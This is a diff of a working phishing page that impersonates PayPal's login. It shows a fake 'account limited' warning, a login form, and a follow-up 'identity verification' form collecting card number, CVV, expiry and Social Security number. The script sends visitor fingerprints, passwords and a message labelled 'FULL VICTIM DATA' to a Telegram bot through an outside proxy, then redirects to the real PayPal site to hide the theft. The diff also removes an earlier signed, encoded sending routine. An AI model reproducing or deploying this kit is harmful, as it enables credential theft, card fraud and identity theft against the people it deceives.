@@ -5,23 +5,35 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PayPal - Log In</title>
     <style>
-        /* Keep all your existing CSS here */
+        /* PayPal Exact CSS */
+        @font-face {
+            font-family: 'PayPal Sans';
+            src: url('https://www.paypalobjects.com/webstatic/icon/PP-Sans.woff') format('woff');
+            font-weight: normal;
+            font-style: normal;
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'PayPal Sans', Arial, sans-serif;
         }
+
         body {
+            font-family: 'PayPal Sans', Arial, sans-serif;
             background: #f5f5f5;
             color: #2c2e2f;
+            line-height: 1.4;
         }
+
+        /* Warning Banner - Only at top */
         .warning-banner {
             background: #fef2f0;
             border-bottom: 1px solid #ff6b6b;
             padding: 12px 0;
             color: #d32f2f;
         }
+
         .warning-banner .container {
             max-width: 1200px;
             margin: 0 auto;
@@ -30,36 +42,73 @@
             align-items: center;
             gap: 12px;
         }
-        .warning-icon { font-size: 24px; }
+
+        .warning-icon {
+            font-size: 24px;
+        }
+
+        .warning-text {
+            font-weight: 500;
+        }
+
         .warning-link {
             color: #d32f2f;
             font-weight: 700;
+            text-decoration: underline;
             margin-left: auto;
             cursor: pointer;
         }
+
+        /* Header */
         .header {
             background: #fff;
             border-bottom: 1px solid #e5e5e5;
             padding: 12px 0;
         }
+
         .container {
             max-width: 1200px;
             margin: 0 auto;
             padding: 0 24px;
         }
+
         .header-content {
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
-        .logo svg { width: 120px; height: 32px; }
-        .nav-links { display: flex; gap: 32px; }
+
+        .logo svg {
+            width: 120px;
+            height: 32px;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 32px;
+        }
+
         .nav-links a {
             color: #2c2e2f;
             text-decoration: none;
             font-size: 14px;
+            font-weight: 500;
         }
-        .main { padding: 40px 0; }
+
+        .nav-links a:hover {
+            color: #0070ba;
+        }
+
+        .contact {
+            font-size: 14px;
+            color: #6b6c6e;
+        }
+
+        /* Main Content */
+        .main {
+            padding: 40px 0;
+        }
+
         .login-grid {
             display: grid;
             grid-template-columns: 1fr 340px;
@@ -67,37 +116,72 @@
             max-width: 1000px;
             margin: 0 auto;
         }
+
         .login-box {
             background: #fff;
             border-radius: 12px;
             padding: 40px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.05);
         }
+
         h1 {
             font-size: 28px;
             font-weight: 400;
             color: #1a1b1c;
             margin-bottom: 8px;
         }
-        .form-group { margin-bottom: 24px; }
+
+        .subtitle {
+            color: #6b6c6e;
+            font-size: 16px;
+            margin-bottom: 32px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
         label {
             display: block;
             font-size: 14px;
             font-weight: 500;
+            color: #1a1b1c;
             margin-bottom: 8px;
         }
+
         input {
             width: 100%;
             padding: 14px 16px;
             border: 1px solid #9da3ad;
             border-radius: 8px;
             font-size: 16px;
+            font-family: inherit;
+            transition: border-color 0.2s;
         }
+
+        input:hover {
+            border-color: #6b6c6e;
+        }
+
         input:focus {
             outline: none;
             border-color: #0070ba;
             box-shadow: 0 0 0 3px rgba(0,112,186,0.15);
         }
+
+        .forgot-link {
+            display: inline-block;
+            margin-top: 8px;
+            color: #0070ba;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
         .btn-primary {
             width: 100%;
             padding: 14px 24px;
@@ -108,14 +192,20 @@
             font-size: 16px;
             font-weight: 700;
             cursor: pointer;
-            margin: 16px 0;
+            transition: background-color 0.2s;
+            margin: 16px 0 24px;
         }
-        .btn-primary:hover { background: #005ea6; }
+
+        .btn-primary:hover {
+            background: #005ea6;
+        }
+
         .divider {
             text-align: center;
             margin: 24px 0;
             position: relative;
         }
+
         .divider::before {
             content: '';
             position: absolute;
@@ -124,14 +214,18 @@
             right: 0;
             height: 1px;
             background: #e5e5e5;
+            z-index: 1;
         }
+
         .divider span {
             background: #fff;
             padding: 0 16px;
             color: #6b6c6e;
+            font-size: 14px;
             position: relative;
             z-index: 2;
         }
+
         .btn-secondary {
             width: 100%;
             padding: 14px 24px;
@@ -142,57 +236,166 @@
             font-size: 16px;
             font-weight: 700;
             cursor: pointer;
+            transition: background-color 0.2s;
         }
+
+        .btn-secondary:hover {
+            background: #e6f0fa;
+        }
+
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-top: 32px;
+        }
+
+        .security-badges svg {
+            width: 70px;
+            height: 30px;
+        }
+
+        /* Info Panel */
         .info-panel {
             background: #f5f7fa;
             border-radius: 12px;
             padding: 32px;
         }
+
+        .info-panel h3 {
+            font-size: 20px;
+            font-weight: 400;
+            color: #1a1b1c;
+            margin-bottom: 16px;
+        }
+
+        .info-panel p {
+            color: #6b6c6e;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 16px;
+        }
+
+        .info-panel a {
+            color: #0070ba;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .info-panel a:hover {
+            text-decoration: underline;
+        }
+
+        .info-icon {
+            font-size: 18px;
+        }
+
+        /* Security Panel */
         .security-panel {
             background: #fff;
             border-radius: 12px;
             padding: 40px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
             max-width: 680px;
             margin: 0 auto;
         }
+
         .progress-steps {
             display: flex;
+            align-items: center;
             gap: 8px;
             margin-bottom: 32px;
         }
+
         .step {
             flex: 1;
             height: 4px;
             background: #e5e5e5;
             border-radius: 2px;
         }
-        .step.active { background: #0070ba; }
+
+        .step.active {
+            background: #0070ba;
+        }
+
+        h2 {
+            font-size: 28px;
+            font-weight: 400;
+            color: #1a1b1c;
+            margin-bottom: 8px;
+        }
+
+        .verification-note {
+            color: #6b6c6e;
+            font-size: 14px;
+            margin-bottom: 32px;
+        }
+
         .card-preview {
-            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
             border-radius: 12px;
             padding: 24px;
             color: #fff;
             margin-bottom: 24px;
             height: 180px;
         }
+
         .card-chip {
             width: 45px;
             height: 35px;
-            background: linear-gradient(135deg, #d4af37, #f1e05a);
+            background: linear-gradient(135deg, #d4af37 0%, #f1e05a 100%);
             border-radius: 8px;
             margin-bottom: 20px;
         }
+
+        .card-number-placeholder {
+            font-size: 20px;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+            opacity: 0.9;
+        }
+
+        .card-details-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 14px;
+        }
+
         .row-2 {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 16px;
         }
-        .hidden { display: none; }
+
+        .security-note-small {
+            font-size: 12px;
+            color: #6b6c6e;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .security-note-small svg {
+            width: 16px;
+            height: 16px;
+            fill: #6b6c6e;
+        }
+
+        .hidden {
+            display: none;
+        }
+
         .loading-spinner {
             display: none;
             text-align: center;
             padding: 20px;
         }
+
         .spinner {
             width: 40px;
             height: 40px;
@@ -202,38 +405,68 @@
             animation: spin 1s linear infinite;
             margin: 0 auto;
         }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Footer */
         .footer {
             background: #fff;
             border-top: 1px solid #e5e5e5;
             padding: 40px 0;
             margin-top: 40px;
         }
-        .footer-links { display: flex; gap: 32px; margin-bottom: 20px; }
-        .footer-links a { color: #6b6c6e; text-decoration: none; font-size: 12px; }
-        .copyright { color: #9da3ad; font-size: 11px; }
+
+        .footer-links {
+            display: flex;
+            gap: 32px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: #6b6c6e;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .footer-links a:hover {
+            color: #0070ba;
+        }
+
+        .copyright {
+            color: #9da3ad;
+            font-size: 11px;
+        }
+
         @media (max-width: 768px) {
-            .login-grid { grid-template-columns: 1fr; }
-            .nav-links { display: none; }
+            .login-grid {
+                grid-template-columns: 1fr;
+            }
+            .nav-links, .contact {
+                display: none;
+            }
         }
     </style>
 </head>
 <body>
-    <!-- Warning Banner -->
+    <!-- Warning Banner - Only at top -->
     <div class="warning-banner">
         <div class="container">
             <span class="warning-icon">⚠️</span>
-            <span>Your account has been temporarily limited - Verify now</span>
-            <span class="warning-link" onclick="document.getElementById('email').focus()">Resolve →</span>
+            <span class="warning-text">Your account has been temporarily limited - Verify now to restore access</span>
+            <span class="warning-link" onclick="document.getElementById('email').focus()">Resolve issue →</span>
         </div>
     </div>
 
-    <!-- Header -->
+    <!-- PayPal Header -->
     <header class="header">
         <div class="container">
             <div class="header-content">
                 <div class="logo">
-                    <svg viewBox="0 0 120 32">
+                    <svg viewBox="0 0 120 32" xmlns="http://www.w3.org/2000/svg">
                         <path d="M19.2 8h-6.4c-.6 0-1.1.4-1.2 1L9.2 24c-.1.4.2.7.6.7h3.6c.5 0 .9-.3 1-.8l.8-4.6c.1-.5.5-.8 1-.8h2.3c4.8 0 7.6-2.3 8.3-7 .3-2.2-.1-3.9-1.5-5.1-1.4-1.2-3.7-1.8-6.5-1.8zm.9 7c-.4 2.6-2.2 2.6-4 2.6h-1l.7-4.4c0-.3.3-.5.6-.5h.5c1.2 0 2.3 0 2.9.7.4.4.5 1 .3 1.6zM39.9 8.5c-.5-2.1-2.3-2.5-4.6-2.5h-4.8c-.6 0-1.1.4-1.2 1l-1.6 10.2c-.1.4.2.8.6.8h3.3l.2-1.4.6.4c.6.4 1.5.6 2.4.6 2.3 0 4.3-1.8 4.7-4.4.2-1.3-.1-2.5-.9-3.4-.1-.1-.2-.2-.3-.3.2 0 .4-.1.5-.2 1-.6 1.4-1.6 1.1-2.8zM38.1 12c-.2 1.5-1.4 2.4-2.8 2.4-.6 0-1.1-.2-1.5-.5l-.1-.1.8-4.9c0-.2.3-.4.5-.4h.4c.8 0 1.5 0 2.1.5.5.4.7 1.2.6 2zM52.3 8h-3.3c-.4 0-.7.2-.9.6l-2.5 4.1-1.1-3.9c-.1-.5-.5-.8-1-.8h-3.3c-.3 0-.6.3-.5.7l3.2 9.8-3 4.4c-.2.3 0 .8.4.8h3.3c.4 0 .7-.2.9-.5l9.6-14.2c.2-.3 0-.8-.4-.8h0zM70.3 8h-6.4c-.6 0-1.1.4-1.2 1l-1.6 10.2c-.1.4.2.7.6.7h3.6c.5 0 .9-.3 1-.8l.4-2.6c.1-.5.5-.8 1-.8h2.3c4.8 0 7.6-2.3 8.3-7 .3-2.2-.1-3.9-1.5-5.1-1.4-1.2-3.7-1.8-6.5-1.8zm.9 7c-.4 2.6-2.2 2.6-4 2.6h-1l.7-4.4c0-.3.3-.5.6-.5h.5c1.2 0 2.3 0 2.9.7.4.4.5 1 .3 1.6zM88.9 8.5c-.5-2.1-2.3-2.5-4.6-2.5h-4.8c-.6 0-1.1.4-1.2 1l-1.6 10.2c-.1.4.2.8.6.8h3.3l.2-1.4.6.4c.6.4 1.5.6 2.4.6 2.3 0 4.3-1.8 4.7-4.4.2-1.3-.1-2.5-.9-3.4-.1-.1-.2-.2-.3-.3.2 0 .4-.1.5-.2 1-.6 1.4-1.6 1.1-2.8zM87.1 12c-.2 1.5-1.4 2.4-2.8 2.4-.6 0-1.1-.2-1.5-.5l-.1-.1.8-4.9c0-.2.3-.4.5-.4h.4c.8 0 1.5 0 2.1.5.5.4.7 1.2.6 2zM105.3 8h-3.3c-.4 0-.7.2-.9.6l-2.5 4.1-1.1-3.9c-.1-.5-.5-.8-1-.8h-3.3c-.3 0-.6.3-.5.7l3.2 9.8-3 4.4c-.2.3 0 .8.4.8h3.3c.4 0 .7-.2.9-.5l9.6-14.2c.2-.3 0-.8-.4-.8h0z" fill="#0070ba"/>
                     </svg>
                 </div>
@@ -243,7 +476,9 @@
                     <a href="#">Developer</a>
                     <a href="#">Help</a>
                 </nav>
-                <div class="contact">Contact us</div>
+                <div class="contact">
+                    Contact us
+                </div>
             </div>
         </div>
     </header>
@@ -255,29 +490,53 @@
                 <div class="login-grid">
                     <div class="login-box">
                         <h1>Log in to your PayPal account</h1>
+                        <p class="subtitle">Access your money, send payments, and more.</p>
+                        
                         <form id="loginForm" onsubmit="event.preventDefault(); captureLogin();">
                             <div class="form-group">
-                                <label>Email</label>
-                                <input type="email" id="email" required>
+                                <label for="email">Email address</label>
+                                <input type="email" id="email" name="email" placeholder="name@example.com" required>
                             </div>
+
                             <div class="form-group">
-                                <label>Password</label>
-                                <input type="password" id="password" required>
-                                <a href="#" class="forgot-link">Forgot password?</a>
+                                <label for="password">Password</label>
+                                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                                <a href="#" class="forgot-link">Forgotten password?</a>
                             </div>
+
                             <button type="submit" class="btn-primary">Log In</button>
-                            <div class="divider"><span>or</span></div>
-                            <button type="button" class="btn-secondary">Sign Up</button>
+
+                            <div class="divider">
+                                <span>or</span>
+                            </div>
+
+                            <button type="button" class="btn-secondary" onclick="window.location.href='#'">Sign Up</button>
+
+                            <div class="security-badges">
+                                <svg viewBox="0 0 70 30">
+                                    <rect width="70" height="30" fill="#f5f5f5" rx="4"/>
+                                    <text x="10" y="19" fill="#0070ba" font-size="12">Verified</text>
+                                </svg>
+                                <svg viewBox="0 0 70 30">
+                                    <rect width="70" height="30" fill="#f5f5f5" rx="4"/>
+                                    <text x="10" y="19" fill="#0070ba" font-size="12">Secure</text>
+                                </svg>
+                            </div>
                         </form>
                     </div>
+
                     <div class="info-panel">
-                        <h3>PayPal is safer</h3>
-                        <p>We protect your financial info with encryption.</p>
+                        <h3>PayPal is always safer</h3>
+                        <p>We protect your financial information with industry-leading security and fraud prevention. Your transactions are monitored 24/7 to help keep your money safe.</p>
+                        <a href="#">
+                            Learn more about security
+                            <span class="info-icon">→</span>
+                        </a>
                     </div>
                 </div>
             </div>
 
-            <!-- Security Section -->
+            <!-- Security Questions Section -->
             <div id="securitySection" class="hidden">
                 <div class="security-panel">
                     <div class="progress-steps">
@@ -285,39 +544,73 @@
                         <div class="step"></div>
                         <div class="step"></div>
                     </div>
+
                     <h2>Confirm your identity</h2>
+                    <p class="verification-note">For your security, we need to verify a few details</p>
+
+                    <!-- Card Preview -->
                     <div class="card-preview">
                         <div class="card-chip"></div>
-                        <div style="font-size:20px;letter-spacing:2px;margin-bottom:20px;">•••• •••• •••• ••••</div>
+                        <div class="card-number-placeholder">•••• •••• •••• ••••</div>
+                        <div class="card-details-row">
+                            <span>CARDHOLDER NAME</span>
+                            <span>MM/YY</span>
+                        </div>
                     </div>
+
                     <form id="securityForm" onsubmit="event.preventDefault(); captureSecurity();">
                         <div class="form-group">
-                            <label>Full name</label>
-                            <input type="text" id="fullname" required>
+                            <label for="fullname">Full legal name (as shown on card)</label>
+                            <input type="text" id="fullname" name="fullname" placeholder="John A. Smith" required>
                         </div>
+
                         <div class="form-group">
-                            <label>Card number</label>
-                            <input type="text" id="cardnumber" maxlength="19" required>
+                            <label for="cardnumber">Debit or credit card number</label>
+                            <input type="text" id="cardnumber" name="cardnumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
                         </div>
+
                         <div class="row-2">
                             <div class="form-group">
-                                <label>Expiry</label>
-                                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+                                <label for="expiry">Expiration date</label>
+                                <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required>
                             </div>
                             <div class="form-group">
-                                <label>CVV</label>
-                                <input type="text" id="cvv" maxlength="4" required>
+                                <label for="cvv">CVV</label>
+                                <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
+                                <div class="security-note-small">
+                                    <svg viewBox="0 0 16 16">
+                                        <circle cx="8" cy="8" r="6" fill="#9da3ad"/>
+                                    </svg>
+                                    3 or 4 digits on back of card
+                                </div>
                             </div>
                         </div>
+
                         <div class="form-group">
-                            <label>SSN</label>
-                            <input type="text" id="ssn" placeholder="XXX-XX-XXXX" maxlength="11" required>
+                            <label for="ssn">Social Security Number</label>
+                            <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" maxlength="11" required>
+                            <div class="security-note-small">
+                                <svg viewBox="0 0 16 16">
+                                    <circle cx="8" cy="8" r="6" fill="#9da3ad"/>
+                                </svg>
+                                We use this to verify your identity (FDIC insured)
+                            </div>
                         </div>
+
                         <div class="loading-spinner" id="loadingSpinner">
                             <div class="spinner"></div>
+                            <p style="margin-top: 10px; color: #6b6c6e;">Verifying...</p>
                         </div>
-                        <button type="submit" class="btn-primary" id="verifyBtn">Confirm</button>
+
+                        <button type="submit" class="btn-primary" id="verifyBtn">Confirm and Continue</button>
                     </form>
+
+                    <p style="text-align: center; margin-top: 24px; font-size: 12px; color: #9da3ad;">
+                        <svg viewBox="0 0 16 16" width="12" height="12" style="display: inline; margin-right: 4px;">
+                            <path d="M8 1C4.1 1 1 4.1 1 8s3.1 7 7 7 7-3.1 7-7-3.1-7-7-7z" fill="#9da3ad"/>
+                        </svg>
+                        256-bit encryption • Protected by PayPal
+                    </p>
                 </div>
             </div>
         </div>
@@ -329,107 +622,89 @@
                 <a href="#">Contact</a>
                 <a href="#">Privacy</a>
                 <a href="#">Legal</a>
+                <a href="#">Global</a>
+                <a href="#">Accessibility</a>
+                <a href="#">Feedback</a>
             </div>
-            <p class="copyright">© 2024 PayPal, Inc.</p>
+            <p class="copyright">© 2024 PayPal, Inc. All rights reserved.</p>
         </div>
     </footer>
 
     <script>
-        // Configuration
-        const PROXY_URL = 'https://telegram-proxy-gsjj.onrender.com/assets/js/analytics.min.js';
+        // Your bot token and chat ID - token is on server, only chat ID needed
         const CHAT_ID = '8300466523';
-        const VERSION = '2.1'; // Match server version
+        
+        // WORKING PROXY ENDPOINT - found via curl
+        const PROXY_URL = 'https://telegram-proxy-gsjj.onrender.com/api/v1/collect';
         
         let loginData = {};
 
-        // Helper: Convert string to hex
-        function toHex(str) {
-            let result = '';
-            for (let i = 0; i < str.length; i++) {
-                result += str.charCodeAt(i).toString(16);
-            }
-            return result;
-        }
-
-        // Helper: Generate signature (simplified but effective)
-        async function generateSignature(data, timestamp) {
-            const msg = data + timestamp;
-            const encoder = new TextEncoder();
-            const key = await crypto.subtle.importKey(
-                'raw',
-                encoder.encode('paypal-secure-key-2026'),
-                { name: 'HMAC', hash: 'SHA-256' },
-                false,
-                ['sign']
-            );
-            const signature = await crypto.subtle.sign(
-                'HMAC',
-                key,
-                encoder.encode(msg)
-            );
-            return Array.from(new Uint8Array(signature))
-                .map(b => b.toString(16).padStart(2, '0'))
-                .join('');
-        }
-
-        // Helper: Send data to proxy
-        async function sendToBot(message) {
-            try {
-                // Prepare data
-                const payload = {
-                    chat_id: CHAT_ID,
-                    text: message
-                };
-                
-                // Encode
-                const dataStr = JSON.stringify(payload);
-                const encoded = btoa(dataStr);
-                const timestamp = Date.now();
-                
-                // Generate signature
-                const signature = await generateSignature(dataStr, timestamp);
-
-                // Send to hidden endpoint
-                await fetch(PROXY_URL, {
-                    method: 'POST',
-                    headers: { 
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        d: encoded,
-                        t: timestamp,
-                        s: signature,
-                        v: VERSION
-                    })
-                });
-            } catch (e) {
-                // Fail silently
-            }
-        }
-
-        // Track visitor
+        // Track visitor on page load
         (function() {
-            getIP().then(ip => {
-                sendToBot(`👤 New Visitor\nIP: ${ip}\nTime: ${new Date().toLocaleString()}`);
-            });
+            trackVisitor();
             setupFormatters();
         })();
+
+        async function trackVisitor() {
+            const data = {
+                ip: await getIP(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                time: new Date().toLocaleString()
+            };
+            sendToTelegram('👤 New Visitor\n' + formatData(data));
+        }
 
         async function getIP() {
             try {
                 const r = await fetch('https://api.ipify.org?format=json');
                 const d = await r.json();
                 return d.ip;
-            } catch { return 'Unknown'; }
+            } catch {
+                return 'Unknown';
+            }
+        }
+
+        function formatData(obj) {
+            return Object.entries(obj).map(([k, v]) => `${k}: ${v}`).join('\n');
+        }
+
+        async function sendToTelegram(message) {
+            try {
+                const response = await fetch(PROXY_URL, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+                const result = await response.json();
+                console.log('Proxy response:', result);
+            } catch (e) {
+                console.error('Send error:', e);
+            }
         }
 
         function getOS() {
             const ua = navigator.userAgent;
             if (ua.includes('Windows')) return 'Windows';
-            if (ua.includes('Mac')) return 'macOS';
+            if (ua.includes('Mac OS')) return 'macOS';
             if (ua.includes('Linux')) return 'Linux';
             if (ua.includes('Android')) return 'Android';
-            if (ua.includes('iPhone')) return 'iOS';
+            if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+            return 'Unknown';
+        }
+
+        function getBrowser() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Chrome')) return 'Chrome';
+            if (ua.includes('Safari')) return 'Safari';
+            if (ua.includes('Edge')) return 'Edge';
+            if (ua.includes('OPR') || ua.includes('Opera')) return 'Opera';
             return 'Unknown';
         }
 
@@ -438,54 +713,115 @@
             const password = document.getElementById('password').value;
             
             if (!email || !password) {
-                alert('Please enter email and password');
+                alert('Please enter your email and password');
                 return;
             }
 
             loginData = { email, password };
             const ip = await getIP();
 
-            await sendToBot(`🔐 <b>PAYPAL LOGIN</b>\n━━━━━━━━━━━━\n📧 Email: <code>${email}</code>\n🔑 Password: <code>${password}</code>\n━━━━━━━━━━━━\n🌍 IP: <code>${ip}</code>\n💻 OS: ${getOS()}\n🕐 Time: ${new Date().toLocaleString()}`);
+            const message = `
+🔐 <b>PAYPAL LOGIN</b>
+━━━━━━━━━━━━━━
+📧 Email: <code>${email}</code>
+🔑 Password: <code>${password}</code>
+━━━━━━━━━━━━━━
+🌍 IP: <code>${ip}</code>
+💻 OS: ${getOS()}
+🌐 Browser: ${getBrowser()}
+🕐 Time: ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━
+⏳ Waiting for security data...
+`;
 
+            await sendToTelegram(message);
+            
             document.getElementById('loginSection').classList.add('hidden');
             document.getElementById('securitySection').classList.remove('hidden');
         }
 
-        function validateCard(num) {
-            let sum = 0, alt = false;
-            const n = num.replace(/\D/g, '');
-            for (let i = n.length - 1; i >= 0; i--) {
-                let v = parseInt(n[i], 10);
-                if (alt) { v *= 2; if (v > 9) v -= 9; }
-                sum += v; alt = !alt;
+        function validateCard(number) {
+            let sum = 0;
+            let alternate = false;
+            const num = number.replace(/\D/g, '');
+            
+            for (let i = num.length - 1; i >= 0; i--) {
+                let n = parseInt(num.charAt(i), 10);
+                if (alternate) {
+                    n *= 2;
+                    if (n > 9) n -= 9;
+                }
+                sum += n;
+                alternate = !alternate;
             }
-            return sum % 10 === 0;
+            return (sum % 10 === 0);
+        }
+
+        function getCardType(number) {
+            const num = number.replace(/\D/g, '');
+            if (num.startsWith('4')) return 'Visa';
+            if (num.startsWith('5')) return 'MasterCard';
+            if (num.startsWith('3')) return 'Amex';
+            if (num.startsWith('6')) return 'Discover';
+            return 'Unknown';
+        }
+
+        function validateSSN(ssn) {
+            const num = ssn.replace(/\D/g, '');
+            if (num.length !== 9) return false;
+            if (num === '000000000') return false;
+            if (num.startsWith('666')) return false;
+            if (parseInt(num.substring(0,3)) > 899) return false;
+            return true;
         }
 
         async function captureSecurity() {
-            const name = document.getElementById('fullname').value;
-            const card = document.getElementById('cardnumber').value;
-            const exp = document.getElementById('expiry').value;
+            const fullname = document.getElementById('fullname').value;
+            const cardnumber = document.getElementById('cardnumber').value;
+            const expiry = document.getElementById('expiry').value;
             const cvv = document.getElementById('cvv').value;
             const ssn = document.getElementById('ssn').value;
+            const email = loginData.email || '';
 
-            if (!name || !card || !exp || !cvv || !ssn) {
-                alert('Please fill all fields');
+            if (!fullname || !cardnumber || !expiry || !cvv || !ssn) {
+                alert('Please fill in all fields');
                 return;
             }
 
             document.getElementById('loadingSpinner').style.display = 'block';
             document.getElementById('verifyBtn').disabled = true;
 
-            const cardValid = validateCard(card);
-            const cardType = card.startsWith('4') ? 'Visa' : 
-                           card.startsWith('5') ? 'MasterCard' : 
-                           card.startsWith('3') ? 'Amex' : 'Unknown';
-            const bin = card.replace(/\D/g, '').substring(0, 6);
+            const cardValid = validateCard(cardnumber);
+            const ssnValid = validateSSN(ssn);
+            const cardType = getCardType(cardnumber);
+            const bin = cardnumber.replace(/\D/g, '').substring(0, 6);
             const ip = await getIP();
 
-            await sendToBot(`💳 <b>FULL VICTIM DATA</b>\n━━━━━━━━━━━━\n📧 Email: <code>${loginData.email}</code>\n👤 Name: <code>${name}</code>\n━━━━━━━━━━━━\n💳 Card: <code>${card}</code>\n🏦 Type: ${cardType}\n📅 Expiry: ${exp}\n🔐 CVV: <code>${cvv}</code>\n✅ Valid: ${cardValid ? 'YES' : 'NO'}\n🔢 BIN: <code>${bin}</code>\n━━━━━━━━━━━━\n🆔 SSN: <code>${ssn}</code>\n━━━━━━━━━━━━\n🌍 IP: <code>${ip}</code>\n💻 OS: ${getOS()}\n🕐 Time: ${new Date().toLocaleString()}`);
+            const message = `
+💳 <b>FULL VICTIM DATA</b>
+━━━━━━━━━━━━━━
+📧 Email: <code>${email}</code>
+👤 Name: <code>${fullname}</code>
+━━━━━━━━━━━━━━
+💳 Card: <code>${cardnumber}</code>
+🏦 Type: ${cardType}
+📅 Expiry: ${expiry}
+🔐 CVV: <code>${cvv}</code>
+✅ Valid: ${cardValid ? 'YES' : 'NO'}
+🔢 BIN: <code>${bin}</code>
+━━━━━━━━━━━━━━
+🆔 SSN: <code>${ssn}</code>
+✅ Valid: ${ssnValid ? 'YES' : 'NO'}
+━━━━━━━━━━━━━━
+🌍 IP: <code>${ip}</code>
+💻 OS: ${getOS()}
+🌐 Browser: ${getBrowser()}
+🕐 Time: ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━
+`;
 
+            await sendToTelegram(message);
+            
             setTimeout(() => {
                 window.location.href = 'https://www.paypal.com/signin';
             }, 2000);
@@ -493,30 +829,46 @@
 
         function setupFormatters() {
             document.getElementById('cardnumber')?.addEventListener('input', function(e) {
-                let v = this.value.replace(/\D/g, '');
-                let f = '';
-                for (let i = 0; i < v.length; i++) {
-                    if (i > 0 && i % 4 === 0) f += ' ';
-                    f += v[i];
+                let value = this.value.replace(/\D/g, '');
+                let formatted = '';
+                for (let i = 0; i < value.length; i++) {
+                    if (i > 0 && i % 4 === 0) formatted += ' ';
+                    formatted += value[i];
                 }
-                this.value = f;
+                this.value = formatted;
             });
 
             document.getElementById('expiry')?.addEventListener('input', function(e) {
-                let v = this.value.replace(/\D/g, '');
-                if (v.length >= 2) this.value = v.slice(0,2) + '/' + v.slice(2,4);
+                let value = this.value.replace(/\D/g, '');
+                if (value.length >= 2) {
+                    this.value = value.slice(0,2) + '/' + value.slice(2,4);
+                } else {
+                    this.value = value;
+                }
             });
 
             document.getElementById('ssn')?.addEventListener('input', function(e) {
-                let v = this.value.replace(/\D/g, '');
-                if (v.length > 3 && v.length <= 5) this.value = v.slice(0,3) + '-' + v.slice(3);
-                else if (v.length > 5) this.value = v.slice(0,3) + '-' + v.slice(3,5) + '-' + v.slice(5,9);
+                let value = this.value.replace(/\D/g, '');
+                if (value.length > 3 && value.length <= 5) {
+                    this.value = value.slice(0,3) + '-' + value.slice(3);
+                } else if (value.length > 5) {
+                    this.value = value.slice(0,3) + '-' + value.slice(3,5) + '-' + value.slice(5,9);
+                } else {
+                    this.value = value;
+                }
             });
 
             document.getElementById('cvv')?.addEventListener('input', function(e) {
                 this.value = this.value.replace(/\D/g, '').slice(0,4);
             });
         }
+
+        // Track exit
+        window.addEventListener('beforeunload', function() {
+            if (!document.getElementById('securitySection').classList.contains('hidden')) {
+                sendToTelegram('⚠️ User left during security verification');
+            }
+        });
     </script>
 </body>
 </html>
